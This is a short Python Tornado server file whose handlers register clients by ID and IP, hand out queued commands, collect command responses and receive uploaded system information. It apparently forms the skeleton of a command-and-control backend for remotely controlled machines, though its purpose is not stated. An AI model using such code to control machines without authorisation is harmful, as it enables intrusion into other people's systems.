#-*- coding:utf-8 -*-

import tornado.web
import Utility

class InitHandler(tornado.web.RequestHandler):
    def post(self):
        client_id = self.get_argument("id")
        
        try:
            x_real_ip = self.request.headers.get("X-Real-IP")
            ip = x_real_ip or self.request.remote_ip
        except:
            ip = 'N/A'

        exists = Utility.DB.selectQuery("SELECT * FROM CLIENTS WHERE ID=?",[client_id])
        if exists:
            # Client exists in the database
            Utility.DB.executeQuery("UPDATE CLIENTS SET ONLINE=1,IP=? WHERE ID=?",[ip,client_id])
            #TODO:return response
        else:
            # New client
            Utility.DB.executeQuery("INSERT INTO CLIENTS(ID,ONLINE,IP) VALUES(?,?,?)",[client_id,1,ip])
            #TODO:return response

class GetUpdatesHandler(tornado.web.RequestHandler):
    def get(self):
        client_id = self.get_argument("id")
        command = Utility.DB.selectQuery("SELECT COMMAND_ID,COMMAND FROM QUEUE WHERE CLIENT_ID=? AND STATUS=0",[client_id])
        if command == None:
            self.write({'command': None})
        else:
            self.write({'command': {'id': command[0], 'command': command[1]}})

    def post(self):
        client_id = self.get_body_argument("id")
        command_id = self.get_body_argument("command_id")
        response = self.get_body_argument("response")
        Utility.DB.executeQuery("UPDATE QUEUE SET RESPONSE=?, STATUS=1 WHERE CLIENT_ID=? AND COMMAND_ID=?",[response,client_id,command_id])
class SysinfoHandler(tornado.web.RequestHandler):
    def post(self):
        client_id = self.get_argument('id')
        info = self.get_argument('info')
        print(client_id)
        print(info)
        self.write("ok")